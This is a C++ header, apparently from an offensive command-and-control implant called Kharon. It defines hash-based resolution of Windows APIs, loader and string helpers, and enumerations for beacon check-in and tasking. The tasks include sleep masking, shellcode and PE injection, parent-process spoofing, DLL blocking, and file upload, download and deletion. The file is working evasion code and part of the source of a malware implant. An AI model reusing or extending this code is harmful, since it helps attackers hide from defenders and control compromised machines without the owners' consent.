#ifndef MISC_H
#define MISC_H

#include <Kharon.h>

// using namespace Root;

#define RSL_TYPE( x )   .x = reinterpret_cast<decltype( x )*>( Hsh::StrA( #x ) )
#define RSL_API( m, f ) LdrLoad::Api<decltype(s)>( m, Hsh::StrA( #f ) )

#define RSL_IMP( m ) { \
    for ( int i = 1; i < Hsh::StructCount<decltype( Kharon::m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &m )[ i ] = LdrLoad::_Api( m.Handle, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

namespace LdrLoad {
    auto Library(
        _In_ PCHAR LibName
    ) -> UPTR;

    auto Module(
       _In_ const ULONG LibHash
    ) -> UPTR;

    auto _Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbBase
    ) -> UPTR;

    template <typename T>
    inline auto Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbHash
    ) -> T* {
        return reinterpret_cast<T*>( _Api( ModBase, SymbHash ) );
    }
}

namespace Hsh {
    template <typename T>
    constexpr SIZE_T StructCount() {
        SIZE_T Count = 0;
        SIZE_T StructLen   = sizeof( T );

        while ( StructLen > Count * sizeof( UPTR ) ) {
            Count++;
        }

        return Count;
    }

    template <typename T = char>
    inline auto DECLFN StrA(
        _In_ const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;

        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );

            if ( Value >= 'a' ) {
                Value -= 0x20;
            }

            CstHash ^= Value;
            CstHash *= 0x01000193;
        }

        return CstHash;
    }

    template <typename T = char>
    constexpr auto XprStrA(
        const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;
    
        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );
    
            if ( Value >= 'a' ) {
                Value -= 0x20;
            }
    
            CstHash ^= Value;
            CstHash *= 0x01000193;
        }
    
        return CstHash;
    }
}

namespace Mem {
    auto DECLFN Copy(
        _In_ PVOID Dst,
        _In_ PVOID Src,
        _In_ ULONG Size
    ) -> PVOID;

    auto DECLFN Set(
        _In_ UPTR Addr,
        _In_ UPTR Val,
        _In_ UPTR Size
    ) -> void;

    auto DECLFN Zero(
        _In_ UPTR Addr,
        _In_ UPTR Size
    ) -> void;
}

namespace Str {
    auto WCharToChar( 
        PCHAR  Dest, 
        PWCHAR Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto CharToWChar( 
        PWCHAR Dest, 
        PCHAR  Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto LengthA( 
        LPCSTR String 
    ) -> SIZE_T;

    auto LengthW( 
        LPCWSTR String 
    ) -> SIZE_T;

    auto CompareCountA( 
        PCSTR Str1, 
        PCSTR Str2, 
        INT16 Count 
    ) -> INT;

    auto CompareA( 
        LPCSTR Str1, 
        LPCSTR Str2 
    ) -> INT;

    auto CompareW( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> INT;

    auto ToUpperChar(
        char* str
    ) -> VOID;

    auto ToLowerChar( 
        PCHAR Str
    ) -> VOID;

    auto ToLowerWchar( 
        WCHAR Ch 
    ) -> WCHAR;

    auto CopyA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto CopyW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto ConcatA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto ConcatW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto IsEqual( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> BOOL;

    auto InitUnicode( 
        PUNICODE_STRING UnicodeString, 
        PWSTR           Buffer 
    ) -> VOID;

    auto GenRnd( 
        ULONG StringSize
    ) -> PCHAR;
}

enum {
    KhGetTask,
    KhPostReq,
    KhCheckin = 241,
    KhError,
    KhNoTask
} KH_CORE;

enum {
    TskSleepTime = 10,
    TskSleepMask,
    TskProcess,
    TskInjection,
    TskFileSystem,
    TskUpload,
    TskDownload,
    TskGetInfo,
    TskExit
} KH_TASKS;

enum {
    SbExitThread,
    SbExitProcess
} TSK_SB_EXIT;

enum {
    SbInjShellcode,
    SbInjPE
} TSK_SB_INJ;

enum {
    SbPsList = 20,
    SbPsCreate,
    SbPsKill,
    SbPsPpid,
    SbPsBlockDlls,
    SbPsCurDir
} TSK_SB_PROCESS;

enum {
    SbFsList = 30,
    SbFsRead,
    SbFsCwd,
    SbFsMove,
    SbFsCopy,
    SbFsMakeDir,
    SbFsDelete,
    SbFsChangeDir
} TSK_SB_FILESYSTEM;

#endif